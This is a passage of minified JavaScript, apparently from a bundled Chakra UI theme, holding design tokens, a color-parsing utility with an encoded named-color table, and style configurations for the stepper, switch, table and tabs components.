  my = { hide: -1, auto: "auto", base: 0, docked: 10, dropdown: 1e3, sticky: 1100, banner: 1200, overlay: 1300, modal: 1400, popover: 1500, skipLink: 1600, toast: 1700, tooltip: 1800 },
  gy = { none: 0, "1px": "1px solid", "2px": "2px solid", "4px": "4px solid", "8px": "8px solid" },
  vy = { base: "0em", sm: "30em", md: "48em", lg: "62em", xl: "80em", "2xl": "96em" },
  yy = {
      transparent: "transparent",
      current: "currentColor",
      black: "#000000",
      white: "#FFFFFF",
      whiteAlpha: {
          50: "rgba(255, 255, 255, 0.04)",
          100: "rgba(255, 255, 255, 0.06)",
          200: "rgba(255, 255, 255, 0.08)",
          300: "rgba(255, 255, 255, 0.16)",
          400: "rgba(255, 255, 255, 0.24)",
          500: "rgba(255, 255, 255, 0.36)",
          600: "rgba(255, 255, 255, 0.48)",
          700: "rgba(255, 255, 255, 0.64)",
          800: "rgba(255, 255, 255, 0.80)",
          900: "rgba(255, 255, 255, 0.92)",
      },
      blackAlpha: {
          50: "rgba(0, 0, 0, 0.04)",
          100: "rgba(0, 0, 0, 0.06)",
          200: "rgba(0, 0, 0, 0.08)",
          300: "rgba(0, 0, 0, 0.16)",
          400: "rgba(0, 0, 0, 0.24)",
          500: "rgba(0, 0, 0, 0.36)",
          600: "rgba(0, 0, 0, 0.48)",
          700: "rgba(0, 0, 0, 0.64)",
          800: "rgba(0, 0, 0, 0.80)",
          900: "rgba(0, 0, 0, 0.92)",
      },
      gray: { 50: "#F7FAFC", 100: "#EDF2F7", 200: "#E2E8F0", 300: "#CBD5E0", 400: "#A0AEC0", 500: "#718096", 600: "#4A5568", 700: "#2D3748", 800: "#1A202C", 900: "#171923" },
      red: { 50: "#FFF5F5", 100: "#FED7D7", 200: "#FEB2B2", 300: "#FC8181", 400: "#F56565", 500: "#E53E3E", 600: "#C53030", 700: "#9B2C2C", 800: "#822727", 900: "#63171B" },
      orange: { 50: "#FFFAF0", 100: "#FEEBC8", 200: "#FBD38D", 300: "#F6AD55", 400: "#ED8936", 500: "#DD6B20", 600: "#C05621", 700: "#9C4221", 800: "#7B341E", 900: "#652B19" },
      yellow: { 50: "#FFFFF0", 100: "#FEFCBF", 200: "#FAF089", 300: "#F6E05E", 400: "#ECC94B", 500: "#D69E2E", 600: "#B7791F", 700: "#975A16", 800: "#744210", 900: "#5F370E" },
      green: { 50: "#F0FFF4", 100: "#C6F6D5", 200: "#9AE6B4", 300: "#68D391", 400: "#48BB78", 500: "#38A169", 600: "#2F855A", 700: "#276749", 800: "#22543D", 900: "#1C4532" },
      teal: { 50: "#E6FFFA", 100: "#B2F5EA", 200: "#81E6D9", 300: "#4FD1C5", 400: "#38B2AC", 500: "#319795", 600: "#2C7A7B", 700: "#285E61", 800: "#234E52", 900: "#1D4044" },
      blue: { 50: "#ebf8ff", 100: "#bee3f8", 200: "#90cdf4", 300: "#63b3ed", 400: "#4299e1", 500: "#3182ce", 600: "#2b6cb0", 700: "#2c5282", 800: "#2a4365", 900: "#1A365D" },
      cyan: { 50: "#EDFDFD", 100: "#C4F1F9", 200: "#9DECF9", 300: "#76E4F7", 400: "#0BC5EA", 500: "#00B5D8", 600: "#00A3C4", 700: "#0987A0", 800: "#086F83", 900: "#065666" },
      purple: { 50: "#FAF5FF", 100: "#E9D8FD", 200: "#D6BCFA", 300: "#B794F4", 400: "#9F7AEA", 500: "#805AD5", 600: "#6B46C1", 700: "#553C9A", 800: "#44337A", 900: "#322659" },
      pink: { 50: "#FFF5F7", 100: "#FED7E2", 200: "#FBB6CE", 300: "#F687B3", 400: "#ED64A6", 500: "#D53F8C", 600: "#B83280", 700: "#97266D", 800: "#702459", 900: "#521B41" },
      linkedin: { 50: "#E8F4F9", 100: "#CFEDFB", 200: "#9BDAF3", 300: "#68C7EC", 400: "#34B3E4", 500: "#00A0DC", 600: "#008CC9", 700: "#0077B5", 800: "#005E93", 900: "#004471" },
      facebook: { 50: "#E8F4F9", 100: "#D9DEE9", 200: "#B7C2DA", 300: "#6482C0", 400: "#4267B2", 500: "#385898", 600: "#314E89", 700: "#29487D", 800: "#223B67", 900: "#1E355B" },
      messenger: { 50: "#D0E6FF", 100: "#B9DAFF", 200: "#A2CDFF", 300: "#7AB8FF", 400: "#2E90FF", 500: "#0078FF", 600: "#0063D1", 700: "#0052AC", 800: "#003C7E", 900: "#002C5C" },
      whatsapp: { 50: "#dffeec", 100: "#b9f5d0", 200: "#90edb3", 300: "#65e495", 400: "#3cdd78", 500: "#22c35e", 600: "#179848", 700: "#0c6c33", 800: "#01421c", 900: "#001803" },
      twitter: { 50: "#E5F4FD", 100: "#C8E9FB", 200: "#A8DCFA", 300: "#83CDF7", 400: "#57BBF5", 500: "#1DA1F2", 600: "#1A94DA", 700: "#1681BF", 800: "#136B9E", 900: "#0D4D71" },
      telegram: { 50: "#E3F2F9", 100: "#C5E4F3", 200: "#A2D4EC", 300: "#7AC1E4", 400: "#47A9DA", 500: "#0088CC", 600: "#007AB8", 700: "#006BA1", 800: "#005885", 900: "#003F5E" },
  },
  by = { none: "0", sm: "0.125rem", base: "0.25rem", md: "0.375rem", lg: "0.5rem", xl: "0.75rem", "2xl": "1rem", "3xl": "1.5rem", full: "9999px" },
  xy = {
      xs: "0 0 0 1px rgba(0, 0, 0, 0.05)",
      sm: "0 1px 2px 0 rgba(0, 0, 0, 0.05)",
      base: "0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06)",
      md: "0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06)",
      lg: "0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)",
      xl: "0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04)",
      "2xl": "0 25px 50px -12px rgba(0, 0, 0, 0.25)",
      outline: "0 0 0 3px rgba(66, 153, 225, 0.6)",
      inner: "inset 0 2px 4px 0 rgba(0,0,0,0.06)",
      none: "none",
      "dark-lg": "rgba(0, 0, 0, 0.1) 0px 0px 0px 1px, rgba(0, 0, 0, 0.2) 0px 5px 10px, rgba(0, 0, 0, 0.4) 0px 15px 40px",
  },
  wy = { none: 0, sm: "4px", base: "8px", md: "12px", lg: "16px", xl: "24px", "2xl": "40px", "3xl": "64px" },
  Sy = {
      letterSpacings: { tighter: "-0.05em", tight: "-0.025em", normal: "0", wide: "0.025em", wider: "0.05em", widest: "0.1em" },
      lineHeights: { normal: "normal", none: 1, shorter: 1.25, short: 1.375, base: 1.5, tall: 1.625, taller: "2", 3: ".75rem", 4: "1rem", 5: "1.25rem", 6: "1.5rem", 7: "1.75rem", 8: "2rem", 9: "2.25rem", 10: "2.5rem" },
      fontWeights: { hairline: 100, thin: 200, light: 300, normal: 400, medium: 500, semibold: 600, bold: 700, extrabold: 800, black: 900 },
      fonts: {
          heading: '-apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"',
          body: '-apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol"',
          mono: 'SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace',
      },
      fontSizes: {
          "3xs": "0.45rem",
          "2xs": "0.625rem",
          xs: "0.75rem",
          sm: "0.875rem",
          md: "1rem",
          lg: "1.125rem",
          xl: "1.25rem",
          "2xl": "1.5rem",
          "3xl": "1.875rem",
          "4xl": "2.25rem",
          "5xl": "3rem",
          "6xl": "3.75rem",
          "7xl": "4.5rem",
          "8xl": "6rem",
          "9xl": "8rem",
      },
  },
  ky = {
      px: "1px",
      0.5: "0.125rem",
      1: "0.25rem",
      1.5: "0.375rem",
      2: "0.5rem",
      2.5: "0.625rem",
      3: "0.75rem",
      3.5: "0.875rem",
      4: "1rem",
      5: "1.25rem",
      6: "1.5rem",
      7: "1.75rem",
      8: "2rem",
      9: "2.25rem",
      10: "2.5rem",
      12: "3rem",
      14: "3.5rem",
      16: "4rem",
      20: "5rem",
      24: "6rem",
      28: "7rem",
      32: "8rem",
      36: "9rem",
      40: "10rem",
      44: "11rem",
      48: "12rem",
      52: "13rem",
      56: "14rem",
      60: "15rem",
      64: "16rem",
      72: "18rem",
      80: "20rem",
      96: "24rem",
  },
  Ey = {
      ...ky,
      max: "max-content",
      min: "min-content",
      full: "100%",
      "3xs": "14rem",
      "2xs": "16rem",
      xs: "20rem",
      sm: "24rem",
      md: "28rem",
      lg: "32rem",
      xl: "36rem",
      "2xl": "42rem",
      "3xl": "48rem",
      "4xl": "56rem",
      "5xl": "64rem",
      "6xl": "72rem",
      "7xl": "80rem",
      "8xl": "90rem",
      prose: "60ch",
      container: { sm: "640px", md: "768px", lg: "1024px", xl: "1280px" },
  },
  Cy = { breakpoints: vy, zIndices: my, radii: by, blur: wy, colors: yy, ...Sy, sizes: Ey, shadows: xy, space: ky, borders: gy, transition: hy },
  { defineMultiStyleConfig: _y, definePartsStyle: Py } = cy(["stepper", "step", "title", "description", "indicator", "separator", "icon", "number"]),
  Ty = _v("stepper-indicator-size"),
  Ry = _v("stepper-icon-size"),
  zy = _v("stepper-title-font-size"),
  Ay = _v("stepper-description-font-size"),
  jy = _v("stepper-accent-color"),
  Oy = _y({
      baseStyle: Py(({ colorScheme: e }) => ({
          stepper: {
              display: "flex",
              justifyContent: "space-between",
              gap: "4",
              "&[data-orientation=vertical]": { flexDirection: "column", alignItems: "flex-start" },
              "&[data-orientation=horizontal]": { flexDirection: "row", alignItems: "center" },
              [jy.variable]: `colors.${e}.500`,
              _dark: { [jy.variable]: `colors.${e}.200` },
          },
          title: { fontSize: zy.reference, fontWeight: "medium" },
          description: { fontSize: Ay.reference, color: "chakra-subtle-text" },
          number: { fontSize: zy.reference },
          step: { flexShrink: 0, position: "relative", display: "flex", gap: "2", "&[data-orientation=horizontal]": { alignItems: "center" }, flex: "1", "&:last-of-type:not([data-stretch])": { flex: "initial" } },
          icon: { flexShrink: 0, width: Ry.reference, height: Ry.reference },
          indicator: {
              flexShrink: 0,
              borderRadius: "full",
              width: Ty.reference,
              height: Ty.reference,
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              "&[data-status=active]": { borderWidth: "2px", borderColor: jy.reference },
              "&[data-status=complete]": { bg: jy.reference, color: "chakra-inverse-text" },
              "&[data-status=incomplete]": { borderWidth: "2px" },
          },
          separator: {
              bg: "chakra-border-color",
              flex: "1",
              "&[data-status=complete]": { bg: jy.reference },
              "&[data-orientation=horizontal]": { width: "100%", height: "2px", marginStart: "2" },
              "&[data-orientation=vertical]": { width: "2px", position: "absolute", height: "100%", maxHeight: `calc(100% - ${Ty.reference} - 8px)`, top: `calc(${Ty.reference} + 4px)`, insetStart: `calc(${Ty.reference} / 2 - 1px)` },
          },
      })),
      sizes: {
          xs: Py({ stepper: { [Ty.variable]: "sizes.4", [Ry.variable]: "sizes.3", [zy.variable]: "fontSizes.xs", [Ay.variable]: "fontSizes.xs" } }),
          sm: Py({ stepper: { [Ty.variable]: "sizes.6", [Ry.variable]: "sizes.4", [zy.variable]: "fontSizes.sm", [Ay.variable]: "fontSizes.xs" } }),
          md: Py({ stepper: { [Ty.variable]: "sizes.8", [Ry.variable]: "sizes.5", [zy.variable]: "fontSizes.md", [Ay.variable]: "fontSizes.sm" } }),
          lg: Py({ stepper: { [Ty.variable]: "sizes.10", [Ry.variable]: "sizes.6", [zy.variable]: "fontSizes.lg", [Ay.variable]: "fontSizes.md" } }),
      },
      defaultProps: { size: "md", colorScheme: "blue" },
  });
function Fy(e, t = {}) {
  let n = !1;
  function r(t) {
      const n = `chakra-${(["container", "root"].includes(null != t ? t : "") ? [e] : [e, t]).filter(Boolean).join("__")}`;
      return { className: n, selector: `.${n}`, toString: () => t };
  }
  return {
      parts: function (...o) {
          !(function () {
              if (n) throw new Error("[anatomy] .part(...) should only be called once. Did you mean to use .extend(...) ?");
              n = !0;
          })();
          for (const e of o) t[e] = r(e);
          return Fy(e, t);
      },
      toPart: r,
      extend: function (...n) {
          for (const e of n) e in t || (t[e] = r(e));
          return Fy(e, t);
      },
      selectors: function () {
          const e = Object.fromEntries(Object.entries(t).map(([e, t]) => [e, t.selector]));
          return e;
      },
      classnames: function () {
          const e = Object.fromEntries(Object.entries(t).map(([e, t]) => [e, t.className]));
          return e;
      },
      get keys() {
          return Object.keys(t);
      },
      __type: {},
  };
}
var Ny = Fy("accordion").parts("root", "container", "button", "panel").extend("icon"),
  My = Fy("alert").parts("title", "description", "container").extend("icon", "spinner"),
  Ly = Fy("avatar").parts("label", "badge", "container").extend("excessLabel", "group"),
  By = Fy("breadcrumb").parts("link", "item", "container").extend("separator");
Fy("button").parts();
var Iy = Fy("checkbox").parts("control", "icon", "container").extend("label");
Fy("progress").parts("track", "filledTrack").extend("label");
var Dy = Fy("drawer").parts("overlay", "dialogContainer", "dialog").extend("header", "closeButton", "body", "footer"),
  $y = Fy("editable").parts("preview", "input", "textarea"),
  Vy = Fy("form").parts("container", "requiredIndicator", "helperText"),
  Uy = Fy("formError").parts("text", "icon"),
  Wy = Fy("input").parts("addon", "field", "element"),
  Hy = Fy("list").parts("container", "item", "icon"),
  qy = Fy("menu").parts("button", "list", "item").extend("groupTitle", "command", "divider"),
  Yy = Fy("modal").parts("overlay", "dialogContainer", "dialog").extend("header", "closeButton", "body", "footer"),
  Xy = Fy("numberinput").parts("root", "field", "stepperGroup", "stepper");
Fy("pininput").parts("field");
var Gy = Fy("popover").parts("content", "header", "body", "footer").extend("popper", "arrow", "closeButton"),
  Qy = Fy("progress").parts("label", "filledTrack", "track"),
  Ky = Fy("radio").parts("container", "control", "label"),
  Zy = Fy("select").parts("field", "icon"),
  Jy = Fy("slider").parts("container", "track", "thumb", "filledTrack", "mark"),
  eb = Fy("stat").parts("container", "label", "helpText", "number", "icon"),
  tb = Fy("switch").parts("container", "track", "thumb"),
  nb = Fy("table").parts("table", "thead", "tbody", "tr", "th", "td", "tfoot", "caption"),
  rb = Fy("tabs").parts("root", "tab", "tablist", "tabpanel", "tabpanels", "indicator"),
  ob = Fy("tag").parts("container", "label", "closeButton"),
  ab = Fy("card").parts("container", "header", "body", "footer");
function ib(e, t, n) {
  return Math.min(Math.max(e, n), t);
}
class sb extends Error {
  constructor(e) {
      super(`Failed to parse color: "${e}"`);
  }
}
var lb = sb;
function cb(e) {
  if ("string" != typeof e) throw new lb(e);
  if ("transparent" === e.trim().toLowerCase()) return [0, 0, 0, 0];
  let t = e.trim();
  t = vb.test(e)
      ? (function (e) {
            const t = e.toLowerCase().trim(),
                n =
                    db[
                        (function (e) {
                            let t = 5381,
                                n = e.length;
                            for (; n; ) t = (33 * t) ^ e.charCodeAt(--n);
                            return (t >>> 0) % 2341;
                        })(t)
                    ];
            if (!n) throw new lb(e);
            return `#${n}`;
        })(e)
      : e;
  const n = pb.exec(t);
  if (n) {
      const e = Array.from(n).slice(1);
      return [...e.slice(0, 3).map((e) => parseInt(fb(e, 2), 16)), parseInt(fb(e[3] || "f", 2), 16) / 255];
  }
  const r = hb.exec(t);
  if (r) {
      const e = Array.from(r).slice(1);
      return [...e.slice(0, 3).map((e) => parseInt(e, 16)), parseInt(e[3] || "ff", 16) / 255];
  }
  const o = mb.exec(t);
  if (o) {
      const e = Array.from(o).slice(1);
      return [...e.slice(0, 3).map((e) => parseInt(e, 10)), parseFloat(e[3] || "1")];
  }
  const a = gb.exec(t);
  if (a) {
      const [t, n, r, o] = Array.from(a).slice(1).map(parseFloat);
      if (ib(0, 100, n) !== n) throw new lb(e);
      if (ib(0, 100, r) !== r) throw new lb(e);
      return [...bb(t, n, r), Number.isNaN(o) ? 1 : o];
  }
  throw new lb(e);
}
const ub = (e) => parseInt(e.replace(/_/g, ""), 36),
  db = "1q29ehhb 1n09sgk7 1kl1ekf_ _yl4zsno 16z9eiv3 1p29lhp8 _bd9zg04 17u0____ _iw9zhe5 _to73___ _r45e31e _7l6g016 _jh8ouiv _zn3qba8 1jy4zshs 11u87k0u 1ro9yvyo 1aj3xael 1gz9zjz0 _3w8l4xo 1bf1ekf_ _ke3v___ _4rrkb__ 13j776yz _646mbhl _nrjr4__ _le6mbhl 1n37ehkb _m75f91n _qj3bzfz 1939yygw 11i5z6x8 _1k5f8xs 1509441m 15t5lwgf _ae2th1n _tg1ugcv 1lp1ugcv 16e14up_ _h55rw7n _ny9yavn _7a11xb_ 1ih442g9 _pv442g9 1mv16xof 14e6y7tu 1oo9zkds 17d1cisi _4v9y70f _y98m8kc 1019pq0v 12o9zda8 _348j4f4 1et50i2o _8epa8__ _ts6senj 1o350i2o 1mi9eiuo 1259yrp0 1ln80gnw _632xcoy 1cn9zldc _f29edu4 1n490c8q _9f9ziet 1b94vk74 _m49zkct 1kz6s73a 1eu9dtog _q58s1rz 1dy9sjiq __u89jo3 _aj5nkwg _ld89jo3 13h9z6wx _qa9z2ii _l119xgq _bs5arju 1hj4nwk9 1qt4nwk9 1ge6wau6 14j9zlcw 11p1edc_ _ms1zcxe _439shk6 _jt9y70f _754zsow 1la40eju _oq5p___ _x279qkz 1fa5r3rv _yd2d9ip _424tcku _8y1di2_ _zi2uabw _yy7rn9h 12yz980_ __39ljp6 1b59zg0x _n39zfzp 1fy9zest _b33k___ _hp9wq92 1il50hz4 _io472ub _lj9z3eo 19z9ykg0 _8t8iu3a 12b9bl4a 1ak5yw0o _896v4ku _tb8k8lv _s59zi6t _c09ze0p 1lg80oqn 1id9z8wb _238nba5 1kq6wgdi _154zssg _tn3zk49 _da9y6tc 1sg7cv4f _r12jvtt 1gq5fmkz 1cs9rvci _lp9jn1c _xw1tdnb 13f9zje6 16f6973h _vo7ir40 _bt5arjf _rc45e4t _hr4e100 10v4e100 _hc9zke2 _w91egv_ _sj2r1kk 13c87yx8 _vqpds__ _ni8ggk8 _tj9yqfb 1ia2j4r4 _7x9b10u 1fc9ld4j 1eq9zldr _5j9lhpx _ez9zl6o _md61fzm"
      .split(" ")
      .reduce((e, t) => {
          const n = ub(t.substring(0, 3)),
              r = ub(t.substring(3)).toString(16);
          let o = "";
          for (let a = 0; a < 6 - r.length; a++) o += "0";
          return (e[n] = `${o}${r}`), e;
      }, {});
const fb = (e, t) =>
      Array.from(Array(t))
          .map(() => e)
          .join(""),
  pb = new RegExp(`^#${fb("([a-f0-9])", 3)}([a-f0-9])?$`, "i"),
  hb = new RegExp(`^#${fb("([a-f0-9]{2})", 3)}([a-f0-9]{2})?$`, "i"),
  mb = new RegExp(`^rgba?\\(\\s*(\\d+)\\s*${fb(",\\s*(\\d+)\\s*", 2)}(?:,\\s*([\\d.]+))?\\s*\\)$`, "i"),
  gb = /^hsla?\(\s*([\d.]+)\s*,\s*([\d.]+)%\s*,\s*([\d.]+)%(?:\s*,\s*([\d.]+))?\s*\)$/i,
  vb = /^[a-z]+$/i,
  yb = (e) => Math.round(255 * e),
  bb = (e, t, n) => {
      let r = n / 100;
      if (0 === t) return [r, r, r].map(yb);
      const o = (((e % 360) + 360) % 360) / 60,
          a = (1 - Math.abs(2 * r - 1)) * (t / 100),
          i = a * (1 - Math.abs((o % 2) - 1));
      let s = 0,
          l = 0,
          c = 0;
      o >= 0 && o < 1
          ? ((s = a), (l = i))
          : o >= 1 && o < 2
          ? ((s = i), (l = a))
          : o >= 2 && o < 3
          ? ((l = a), (c = i))
          : o >= 3 && o < 4
          ? ((l = i), (c = a))
          : o >= 4 && o < 5
          ? ((s = i), (c = a))
          : o >= 5 && o < 6 && ((s = a), (c = i));
      const u = r - a / 2;
      return [s + u, l + u, c + u].map(yb);
  };
function xb(e, t) {
  const [n, r, o, a] = cb(e);
  return (i = r), (s = o), (l = a - t), `rgba(${ib(0, 255, n).toFixed()}, ${ib(0, 255, i).toFixed()}, ${ib(0, 255, s).toFixed()}, ${parseFloat(ib(0, 1, l).toFixed(3))})`;
  var i, s, l;
}
var wb = (e, t, n) => {
      const r = (function (e, t, n, r, o) {
          for (t = t.split ? t.split(".") : t, r = 0; r < t.length; r++) e = e ? e[t[r]] : o;
          return e === o ? n : e;
      })(e, `colors.${t}`, t);
      try {
          return (
              (function (e) {
                  const [t, n, r, o] = cb(e);
                  let a = (e) => {
                      const t = ib(0, 255, e).toString(16);
                      return 1 === t.length ? `0${t}` : t;
                  };
                  a(t), a(n), a(r), o < 1 && a(Math.round(255 * o));
              })(r),
              r
          );
      } catch {
          return null != n ? n : "#000000";
      }
  },
  Sb = (e, t, n) => {
      var r;
      return null !=
          (r = (function (e, t, n) {
              var r, o, a;
              return null != (a = null == (o = null == (r = e.__cssMap) ? void 0 : r[`${t}.${n}`]) ? void 0 : o.varRef) ? a : n;
          })(e, "colors", t))
          ? r
          : n;
  },
  kb = (e) => (t) => {
      const n = ((e) => {
          const [t, n, r] = cb(e);
          return (299 * t + 587 * n + 114 * r) / 1e3;
      })(wb(t, e));
      return n < 128 ? "dark" : "light";
  },
  Eb = (e, t) => (n) => xb(wb(n, e), 1 - t);
function Cb(e = "1rem", t = "rgba(255, 255, 255, 0.15)") {
  return { backgroundImage: `linear-gradient(\n    45deg,\n    ${t} 25%,\n    transparent 25%,\n    transparent 50%,\n    ${t} 50%,\n    ${t} 75%,\n    transparent 75%,\n    transparent\n  )`, backgroundSize: `${e} ${e}` };
}
function _b(e) {
  const t = `#${Math.floor(16777215 * Math.random())
      .toString(16)
      .padEnd(6, "0")}`;
  return e && ((n = e), 0 !== Object.keys(n).length)
      ? e.string && e.colors
          ? (function (e, t) {
                let n = 0;
                if (0 === e.length) return t[0];
                for (let r = 0; r < e.length; r += 1) (n = e.charCodeAt(r) + ((n << 5) - n)), (n &= n);
                return (n = ((n % t.length) + t.length) % t.length), t[n];
            })(e.string, e.colors)
          : e.string && !e.colors
          ? (function (e) {
                let t = 0;
                if (0 === e.length) return t.toString();
                for (let r = 0; r < e.length; r += 1) (t = e.charCodeAt(r) + ((t << 5) - t)), (t &= t);
                let n = "#";
                for (let r = 0; r < 3; r += 1) {
                    n += `00${((t >> (8 * r)) & 255).toString(16)}`.substr(-2);
                }
                return n;
            })(e.string)
          : e.colors && !e.string
          ? (r = e.colors)[Math.floor(Math.random() * r.length)]
          : t
      : t;
  var n, r;
}
function Pb(e, t) {
  return (n) => ("dark" === n.colorMode ? t : e);
}
function Tb(e) {
  const { orientation: t, vertical: n, horizontal: r } = e;
  return t ? ("vertical" === t ? n : r) : {};
}
function Rb(e) {
  return xg(e) && e.reference ? e.reference : String(e);
}
var zb = (e, ...t) => t.map(Rb).join(` ${e} `).replace(/calc/g, ""),
  Ab = (...e) => `calc(${zb("+", ...e)})`,
  jb = (...e) => `calc(${zb("-", ...e)})`,
  Ob = (...e) => `calc(${zb("*", ...e)})`,
  Fb = (...e) => `calc(${zb("/", ...e)})`,
  Nb = (e) => {
      const t = Rb(e);
      return null == t || Number.isNaN(parseFloat(t)) ? Ob(t, -1) : String(t).startsWith("-") ? String(t).slice(1) : `-${t}`;
  },
  Mb = Object.assign((e) => ({ add: (...t) => Mb(Ab(e, ...t)), subtract: (...t) => Mb(jb(e, ...t)), multiply: (...t) => Mb(Ob(e, ...t)), divide: (...t) => Mb(Fb(e, ...t)), negate: () => Mb(Nb(e)), toString: () => e.toString() }), {
      add: Ab,
      subtract: jb,
      multiply: Ob,
      divide: Fb,
      negate: Nb,
  });
function Lb(e) {
  const t = (function (e, t = "-") {
      return e.replace(/\s+/g, t);
  })(e.toString());
  return t.includes("\\.")
      ? e
      : (function (e) {
            return !Number.isInteger(parseFloat(e.toString()));
        })(e)
      ? t.replace(".", "\\.")
      : e;
}
function Bb(e, t) {
  return `var(${Lb(e)}${t ? `, ${t}` : ""})`;
}
function Ib(e, t = "") {
  return `--${(function (e, t = "") {
      return [t, Lb(e)].filter(Boolean).join("-");
  })(e, t)}`;
}
function Db(e, t) {
  const n = Ib(e, null == t ? void 0 : t.prefix);
  return { variable: n, reference: Bb(n, $b(null == t ? void 0 : t.fallback)) };
}
function $b(e) {
  return "string" == typeof e ? e : null == e ? void 0 : e.reference;
}
var { defineMultiStyleConfig: Vb, definePartsStyle: Ub } = cy(tb.keys),
  Wb = Db("switch-track-width"),
  Hb = Db("switch-track-height"),
  qb = Db("switch-track-diff"),
  Yb = Mb.subtract(Wb, Hb),
  Xb = Db("switch-thumb-x"),
  Gb = Db("switch-bg"),
  Qb = (e) => {
      const { colorScheme: t } = e;
      return {
          borderRadius: "full",
          p: "0.5",
          width: [Wb.reference],
          height: [Hb.reference],
          transitionProperty: "common",
          transitionDuration: "fast",
          [Gb.variable]: "colors.gray.300",
          _dark: { [Gb.variable]: "colors.whiteAlpha.400" },
          _focusVisible: { boxShadow: "outline" },
          _disabled: { opacity: 0.4, cursor: "not-allowed" },
          _checked: { [Gb.variable]: `colors.${t}.500`, _dark: { [Gb.variable]: `colors.${t}.200` } },
          bg: Gb.reference,
      };
  },
  Kb = { bg: "white", transitionProperty: "transform", transitionDuration: "normal", borderRadius: "inherit", width: [Hb.reference], height: [Hb.reference], _checked: { transform: `translateX(${Xb.reference})` } },
  Zb = Vb({
      baseStyle: Ub((e) => ({ container: { [qb.variable]: Yb, [Xb.variable]: qb.reference, _rtl: { [Xb.variable]: Mb(qb).negate().toString() } }, track: Qb(e), thumb: Kb })),
      sizes: {
          sm: Ub({ container: { [Wb.variable]: "1.375rem", [Hb.variable]: "sizes.3" } }),
          md: Ub({ container: { [Wb.variable]: "1.875rem", [Hb.variable]: "sizes.4" } }),
          lg: Ub({ container: { [Wb.variable]: "2.875rem", [Hb.variable]: "sizes.6" } }),
      },
      defaultProps: { size: "md", colorScheme: "blue" },
  }),
  { defineMultiStyleConfig: Jb, definePartsStyle: ex } = cy(nb.keys),
  tx = ex({
      table: { fontVariantNumeric: "lining-nums tabular-nums", borderCollapse: "collapse", width: "full" },
      th: { fontFamily: "heading", fontWeight: "bold", textTransform: "uppercase", letterSpacing: "wider", textAlign: "start" },
      td: { textAlign: "start" },
      caption: { mt: 4, fontFamily: "heading", textAlign: "center", fontWeight: "medium" },
  }),
  nx = { "&[data-is-numeric=true]": { textAlign: "end" } },
  rx = Jb({
      baseStyle: tx,
      variants: {
          simple: ex((e) => {
              const { colorScheme: t } = e;
              return {
                  th: { color: Pb("gray.600", "gray.400")(e), borderBottom: "1px", borderColor: Pb(`${t}.100`, `${t}.700`)(e), ...nx },
                  td: { borderBottom: "1px", borderColor: Pb(`${t}.100`, `${t}.700`)(e), ...nx },
                  caption: { color: Pb("gray.600", "gray.100")(e) },
                  tfoot: { tr: { "&:last-of-type": { th: { borderBottomWidth: 0 } } } },
              };
          }),
          striped: ex((e) => {
              const { colorScheme: t } = e;
              return {
                  th: { color: Pb("gray.600", "gray.400")(e), borderBottom: "1px", borderColor: Pb(`${t}.100`, `${t}.700`)(e), ...nx },
                  td: { borderBottom: "1px", borderColor: Pb(`${t}.100`, `${t}.700`)(e), ...nx },
                  caption: { color: Pb("gray.600", "gray.100")(e) },
                  tbody: { tr: { "&:nth-of-type(odd)": { "th, td": { borderBottomWidth: "1px", borderColor: Pb(`${t}.100`, `${t}.700`)(e) }, td: { background: Pb(`${t}.100`, `${t}.700`)(e) } } } },
                  tfoot: { tr: { "&:last-of-type": { th: { borderBottomWidth: 0 } } } },
              };
          }),
          unstyled: {},
      },
      sizes: {
          sm: ex({ th: { px: "4", py: "1", lineHeight: "4", fontSize: "xs" }, td: { px: "4", py: "2", fontSize: "sm", lineHeight: "4" }, caption: { px: "4", py: "2", fontSize: "xs" } }),
          md: ex({ th: { px: "6", py: "3", lineHeight: "4", fontSize: "xs" }, td: { px: "6", py: "4", lineHeight: "5" }, caption: { px: "6", py: "2", fontSize: "sm" } }),
          lg: ex({ th: { px: "8", py: "4", lineHeight: "5", fontSize: "sm" }, td: { px: "8", py: "5", lineHeight: "6" }, caption: { px: "6", py: "2", fontSize: "md" } }),
      },
      defaultProps: { variant: "simple", size: "md", colorScheme: "gray" },
  }),
  ox = _v("tabs-color"),
  ax = _v("tabs-bg"),
  ix = _v("tabs-border-color"),
  { defineMultiStyleConfig: sx, definePartsStyle: lx } = cy(rb.keys),
  cx = (e) => {
      const { orientation: t } = e;
      return { display: "vertical" === t ? "flex" : "block" };
  },
  ux = (e) => {
      const { isFitted: t } = e;
      return { flex: t ? 1 : void 0, transitionProperty: "common", transitionDuration: "normal", _focusVisible: { zIndex: 1, boxShadow: "outline" }, _disabled: { cursor: "not-allowed", opacity: 0.4 } };
  },
  dx = (e) => {
      const { align: t = "start", orientation: n } = e;
      return { justifyContent: { end: "flex-end", center: "center", start: "flex-start" }[t], flexDirection: "vertical" === n ? "column" : "row" };
  },
  fx = { p: 4 },
  px = lx((e) => ({ root: cx(e), tab: ux(e), tablist: dx(e), tabpanel: fx })),
  hx = { sm: lx({ tab: { py: 1, px: 4, fontSize: "sm" } }), md: lx({ tab: { fontSize: "md", py: 2, px: 4 } }), lg: lx({ tab: { fontSize: "lg", py: 3, px: 4 } }) },
  mx = lx((e) => {
      const { colorScheme: t, orientation: n } = e,
          r = "vertical" === n,
          o = r ? "borderStart" : "borderBottom";
      return {
          tablist: { [o]: "2px solid", borderColor: "inherit" },
          tab: {
              [o]: "2px solid",
              borderColor: "transparent",
              [r ? "marginStart" : "marginBottom"]: "-2px",
              _selected: { [ox.variable]: `colors.${t}.600`, _dark: { [ox.variable]: `colors.${t}.300` }, borderColor: "currentColor" },
              _active: { [ax.variable]: "colors.gray.200", _dark: { [ax.variable]: "colors.whiteAlpha.300" } },
              _disabled: { _active: { bg: "none" } },
              color: ox.reference,
              bg: ax.reference,
          },
      };
  }),
